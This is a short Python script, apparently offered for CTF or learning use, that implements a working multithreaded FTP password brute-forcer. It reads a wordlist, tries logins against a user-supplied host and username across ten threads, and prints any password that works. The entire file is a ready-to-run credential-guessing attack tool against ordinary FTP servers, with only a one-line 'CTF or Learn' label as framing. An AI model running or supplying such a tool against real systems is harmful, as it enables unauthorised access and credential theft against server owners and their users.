# made by CyberMAD

# CTF or Learn

import queue
import threading
import ftplib
import sys

cyan = "\033[38;5;45m"
yello = "\033[38;5;226m"
clear = "\033[0m"

def BruteFTP():
    print(f"""{cyan}
 ____             _       _____ _____ ____  
| __ ) _ __ _   _| |_ ___|  ___|_   _|  _ \ 
|  _ \| '__| | | | __/ _ \ |_    | | | |_) |
| |_) | |  | |_| | ||  __/  _|   | | |  __/ 
|____/|_|   \__,_|\__\___|_|     |_| |_|    
          {clear}""")

def connect(host, port, user, password):
    server = ftplib.FTP()
    try:
        server.connect(host, port)
        server.login(user, password)
        return True
    except ftplib.error_perm:
        return False

def attack(host, port, user, q, stop):
    while not q.empty():
        if stop.is_set():  
            break
        password = q.get()
        print(f"[{cyan}BruteFTP{clear}] {host}{cyan}:{clear}{port} User {cyan}:{clear} {user} Login {cyan}:{clear} {password}")
        if connect(host, port, user, password):
            print(f"[{yello}FIND{clear}] {user}{yello}:{clear}{password}")
            stop.set()
            break
        q.task_done()

def thread(host, port, user, passwords):
    q = queue.Queue()
    stop = threading.Event()

    with open(passwords, "r", encoding="utf-8") as f:
        for password in f.read().splitlines():
            q.put(password)

    threads = []
    for _ in range(10):
        t = threading.Thread(target=attack, args=(host, port, user, q, stop))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == "__main__":
    BruteFTP()
    host = input(f"[{cyan}+{clear}] Host {cyan}:{clear} ")
    port = int(input(f"[{cyan}+{clear}] Port {cyan}:{clear} "))
    user = input(f"[{cyan}*{clear}] Username {cyan}:{clear} ")
    passwords = input(f"[{cyan}*{clear}] Wordlist {cyan}:{clear} ")

    thread(host, port, user, passwords)